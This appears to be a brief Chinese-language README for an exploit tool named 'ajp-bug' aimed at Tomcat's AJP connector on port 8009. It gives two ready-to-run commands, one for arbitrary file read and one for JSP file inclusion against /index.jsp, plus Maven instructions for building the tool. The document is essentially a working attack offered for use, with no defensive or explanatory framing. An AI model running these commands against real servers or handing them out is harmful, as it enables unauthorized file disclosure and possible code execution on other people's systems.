任意文件读取

java -jar ajp-bug-1.0-SNAPSHOT-jar-with-dependencies.jar 127.0.0.1 8009 file /index.jsp

文件包含

java -jar ajp-bug-1.0-SNAPSHOT-jar-with-dependencies.jar 127.0.0.1 8009 jsp /index.jsp

打包方式：

在目录tomcat/ajp-bug
执行 mvn clean compile assembly:assembly